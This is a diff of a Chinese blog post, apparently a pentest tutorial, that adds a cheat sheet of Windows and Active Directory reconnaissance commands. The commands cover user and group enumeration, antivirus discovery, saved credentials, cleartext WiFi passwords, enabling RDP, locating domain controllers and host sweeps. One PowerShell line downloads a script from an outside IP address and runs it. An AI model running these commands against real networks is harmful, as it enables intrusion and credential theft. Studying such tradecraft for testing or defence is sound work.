@@ -24,8 +24,13 @@
 <meta property="og:description" content="内网环境分析什么是内网渗透 内网渗透的第一步，内网信息收集  内网外网的简介 内网又称局域网  外网又称为广域网  内外网的区别  内网和外网的覆盖范围不一样，内网通常是一个学校、一个医院的网络，外网通常指Internet网  内网一般是用于局域网内部的计算机之间的互相通信，如果需要访问Internet，需要借助外网，一般可以使用NAT技术实现内网访问外网  内网地址是私有地址和外网的不同">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/image-20230912203818546.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109154756081.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109161807577.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109165748478.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109170056352.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109170225885.png">
 <meta property="article:published_time" content="2023-09-12T12:33:30.000Z">
-<meta property="article:modified_time" content="2024-01-07T05:14:40.523Z">
+<meta property="article:modified_time" content="2024-01-09T10:16:24.576Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -229,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          663 words
+          3.6k words
         
       </span>
     
@@ -240,7 +245,7 @@
         
         
         
-          6 mins
+          30 mins
         
       </span>
     
@@ -336,7 +341,198 @@
 <p>就是拿到域控，因为域控沦陷了，内网就基本可以说掌握中了</p>
 </li>
 </ol>
-<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><h1 id="域密码凭证获取"><a href="#域密码凭证获取" class="headerlink" title="域密码凭证获取"></a>域密码凭证获取</h1>
+<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="工作组信息收集"><a href="#工作组信息收集" class="headerlink" title="工作组信息收集"></a>工作组信息收集</h2><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><ol>
+<li><p>查看本机用户目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user [name]<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>获取本地管理员信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net localgroup administrators<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前在线用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell;">quser user/[name]<br>query user || qwinsta<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看当前用户的权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami /all<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看当前的权限</p>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">whoami &amp;&amp; whoami /priv<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看当前机器中的所有组名，了解不同的只能</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net localgroup<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ol>
+<li><p>查询网络信息，网络地址段信息收集</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig /all  <br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查询操作信息及软件信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systeminfo /fo  list  <br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查看当前系统版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sehll">wmic os list  brief<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查询本机服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic service list brief  <br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查看安装的软件版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic product get name, version<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>进程信息</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">tasklist</span><br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查看驱动信息</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic startup <span class="hljs-built_in">get</span> *<span class="hljs-number">*c</span>ommand**,caption<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>查看本地可用凭据</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">cmdkey <span class="hljs-string">\l</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看本地密码策略</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> accounts<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看dns缓存</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /displaydns<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><ol>
+<li><p>查看端口和pid</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -ano<br>netstat -anob <span class="hljs-comment"># 需要管理员，这个命令可以查询所有端口发起的应用程序</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看路由表和<em>arp</em>缓存</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-built_in">print</span><br>arp -a<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看共享列表</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> share<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>磁盘映射</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net use k: \\192.168.1.10\c$<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><ol>
+<li><p>查看防火墙配置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netsh firewall show config<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="RDP桌面"><a href="#RDP桌面" class="headerlink" title="RDP桌面"></a>RDP桌面</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#开启</span><br>wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-built_in">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br><span class="hljs-meta">#关闭</span><br>wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-built_in">call</span> SetAllowTSConnections <span class="hljs-number">0</span><br><span class="hljs-meta">#查询并开启RDP服务的端口，返回一个十六进制的端口</span><br>REG QUERY <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNum<br>ber<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="获取杀软信息"><a href="#获取杀软信息" class="headerlink" title="获取杀软信息"></a>获取杀软信息</h3><ol>
+<li><p>获取杀软名</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">WMIC</span> <span class="hljs-operator">/</span><span class="hljs-variable">Namespace</span><span class="hljs-operator">:</span>\\<span class="hljs-variable">root</span>\<span class="hljs-variable">SecurityCenter2</span> <span class="hljs-built_in">Path</span> <span class="hljs-variable">AntiVirusProduct</span> <span class="hljs-built_in">Get</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">/</span><span class="hljs-built_in">Format</span><span class="hljs-operator">:</span><span class="hljs-built_in">List</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取杀软名和安装路径</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">WMIC</span> <span class="hljs-operator">/</span><span class="hljs-variable">Namespace</span><span class="hljs-operator">:</span>\\<span class="hljs-variable">root</span>\<span class="hljs-variable">SecurityCenter2</span> <span class="hljs-built_in">Path</span> <span class="hljs-variable">AntiVirusProduct</span> <span class="hljs-built_in">Get</span> <span class="hljs-variable">displayName</span><span class="hljs-operator">,</span><span class="hljs-variable">productState</span><span class="hljs-operator">,</span><span class="hljs-variable">pathToSignedProductExe</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="WIFE密码"><a href="#WIFE密码" class="headerlink" title="WIFE密码"></a>WIFE密码</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh wlan show<span class="hljs-built_in"> profile </span># 用于查询当前主机连接过的wifi名<br>netsh wlan show<span class="hljs-built_in"> profile </span><span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;wifi_name&quot;</span> <span class="hljs-attribute">key</span>=clear # 查询密码<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109154756081.png" srcset="/img/loading.gif" lazyload alt="image-20240109154756081"></p>
+<h3 id="powershell信息收集"><a href="#powershell信息收集" class="headerlink" title="powershell信息收集"></a>powershell信息收集</h3><p>通过powershell语法执行ps文件</p>
+<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><h3 id="net组件"><a href="#net组件" class="headerlink" title="net组件"></a>net组件</h3><ol>
+<li><p>查询当前域</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure>
+
+<p>但是这个需要将域控的防火墙关闭</p>
+</li>
+<li><p>查询域内所有主机</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span>:august<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询域内所有用户组</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> admins<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询域成员计算机列表</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询系统管理员用户组</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Enterprise</span> admins<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看域控制器</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看域内所有账号</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询指定用户详情信息</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> /domain<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>通过找时间查询域控</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109161807577.png" srcset="/img/loading.gif" lazyload alt="image-20240109161807577"></p>
+</li>
+<li><p>登录本机的域管理员</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net localgroup administrators /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="Dsquery"><a href="#Dsquery" class="headerlink" title="Dsquery"></a>Dsquery</h3><p>这个工具只有域控才有，可以自己上传一个</p>
+<ol>
+<li><p>查看域内的所有的机器</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dsquery computer</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看当前域内的所有的用户名</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><ol>
+<li><p>域控制器的机器名</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">nltest /<span class="hljs-variable constant_">DCLIST</span><span class="hljs-symbol">:MINGY</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看域内的主机名</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netdom query pdc</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看域控的主机名</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">nslookup -<span class="hljs-built_in">type</span>=srv <span class="hljs-variable">_ldap</span>.<span class="hljs-variable">_tcp</span><br></code></pre></td></tr></table></figure>
+
+<p>这个指令可以获取域控的Ip</p>
+</li>
+<li><p>查看域内DNS服务器</p>
+</li>
+</ol>
+   <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nslookup <span class="hljs-attribute">-q</span>=ns mingy.com<br></code></pre></td></tr></table></figure>
+
+<h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ipconfig /<span class="hljs-keyword">all</span><br>nslookup -<span class="hljs-keyword">type</span>=<span class="hljs-keyword">all</span> _ldap._tcp.dc._msdcs.mingy.com<br>setspn -q *<span class="hljs-comment">/*</span><br><span class="hljs-comment">setspn -T mingy.com -q */</span>*<br>net <span class="hljs-keyword">group</span> &quot;domain controllers&quot; /<span class="hljs-keyword">domain</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="内网存活探测"><a href="#内网存活探测" class="headerlink" title="内网存活探测"></a>内网存活探测</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sU -T4 --script nbstat.nse -p137 <span class="hljs-number">10.10.10.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-sU:扫描udp端口</p>
+<p>-T4:指定扫描的速度</p>
+<p>–script:指的是指定脚本</p>
+<p>-p137:指定的端口（文件共享端口）</p>
+</blockquote>
+<h3 id="msf扫描"><a href="#msf扫描" class="headerlink" title="msf扫描"></a>msf扫描</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109165748478.png" srcset="/img/loading.gif" lazyload alt="image-20240109165748478"></p>
+<p>由于kali 不和那些是一个网段，所以用不了，反映了显示状态下kali的局限性，替代方式是vps</p>
+<h3 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109170056352.png" srcset="/img/loading.gif" lazyload alt="image-20240109170056352"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109170225885.png" srcset="/img/loading.gif" lazyload alt="image-20240109170225885"></p>
+<h3 id="icmp协议"><a href="#icmp协议" class="headerlink" title="icmp协议"></a>icmp协议</h3><p>nmap会使用ping 做存活探测</p>
+<blockquote>
+<p>  @for &#x2F;l %i in  (1,1,255) do @ping -n 1 -w  40 10.10.10.%i &amp; if errorlevel 1 (echo  10.10.10.%i&gt;&gt;c:\a.txt) else (e  cho 10.10.10.%i &gt;&gt;c:\b.txt)  </p>
+</blockquote>
+<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>本质是icmp</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress</span><br><span class="hljs-string">192.168.1.1 -EndAddress 192.168.1.254 -ResolveHost -ScanPort -Port 445,135&quot;</span><br>powershell <span class="hljs-built_in">iex</span>(<span class="hljs-built_in">new-object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;http://47.104.255.11:8000/Invoke-TSPingSweep.ps1&#x27;</span>);<span class="hljs-keyword">In</span><br>voke<span class="hljs-literal">-TSPingSweep</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.254</span> <span class="hljs-literal">-ResolveHost</span> <span class="hljs-literal">-ScanPort</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">445</span>,<span class="hljs-number">135</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="内网信息收集工具"><a href="#内网信息收集工具" class="headerlink" title="内网信息收集工具"></a>内网信息收集工具</h2><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><ol>
+<li><p>简介</p>
+<p>内网综合扫描工具，方便一键自动化，全方位漏洞扫描器</p>
+<blockquote>
+<p>  项目地址：<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a>  </p>
+</blockquote>
+</li>
+<li><p>探测存活</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br></code></pre></td></tr></table></figure></li>
+</ol>
+
                 
               </div>
             
